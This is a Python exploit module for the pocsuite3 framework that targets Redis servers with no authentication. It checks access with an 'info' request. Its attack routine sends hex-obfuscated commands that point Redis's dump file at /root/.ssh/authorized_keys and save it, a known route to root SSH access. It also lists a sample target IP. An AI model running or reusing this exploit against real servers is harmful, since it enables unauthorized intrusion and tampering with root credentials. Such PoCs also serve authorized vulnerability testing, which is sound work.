#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
from urllib.parse import urlparse
from pocsuite3.api import register_poc,logger
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '00002'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2017-08-15'
    createDate = '2017-08-15'
    updateDate = '2017-08-15'
    references = [
        'http://blog.knownsec.com/2015/11/\
        analysis-of-redis-unauthorized-of-expolit/']
    name = 'Redis 未授权访问'
    appPowerLink = 'https://www.redis.io'
    appName = 'Redis'
    appVersion = 'All'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    category = POC_CATEGORY.EXPLOITS.REMOTE
    protocol = 'reids'
    desc = '''
            redis 默认没有开启相关认证，黑客直接访问即可获取数据库中所有信息。
    '''
    samples = ['128.36.23.111']

    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 6379
        result = {}
        payload = b'\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'

        try:
            s = socket.socket()
            s.connect((host, int(port)))
            s.send(payload)
            data = s.recv(4096)
            if data and b'redis_version' in data:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '{}:{}'.format(
                    host, port)
                result['extra'] = data.decode('utf-8')
                return self.parse_attack(result)
            else:
                logger.info(data)
        except Exception as e:
            logger.info('{}:{}\t'.format(host,port,str(e)))
        finally:
            s.close()

        return self.parse_attack(result)

    def _attack(self):
        result = {}
        payload = b'\x63\x6f\x6e\x66\x69\x67\x20\x73\x65\x74\x20\x64\x69\x72\x20\x2f\x72\x6f\x6f\x74\x2f\x2e\x73\x73\x68\x2f\x0d\x0a'
        payload2 = b'\x63\x6f\x6e\x66\x69\x67\x20\x73\x65\x74\x20\x64\x62\x66\x69\x6c\x65\x6e\x61\x6d\x65\x20\x22\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x5f\x6b\x65\x79\x73\x22\x0d\x0a'
        payload3 = b'\x73\x61\x76\x65\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.getg_option("rhost")
            port = self.getg_option("rport") or 6379
            s.connect((host, port))
            s.send(payload)
            recvdata1 = s.recv(1024)
            s.send(payload2)
            recvdata2 = s.recv(1024)
            s.send(payload3)
            recvdata3 = s.recv(1024)
            if recvdata1 and b'+OK' in recvdata1:
                if recvdata2 and b'+OK' in recvdata2:
                    if recvdata3 and b'+OK' in recvdata3:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['Info'] = "Redis未授权访问EXP执行成功"
                        result['VerifyInfo']['URL'] = host
                        result['VerifyInfo']['Port'] = port
        except Exception as ex:
            logger.error(str(ex))
        finally:
            s.close()
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("not vulnerability")
        return output


register_poc(TestPOC)
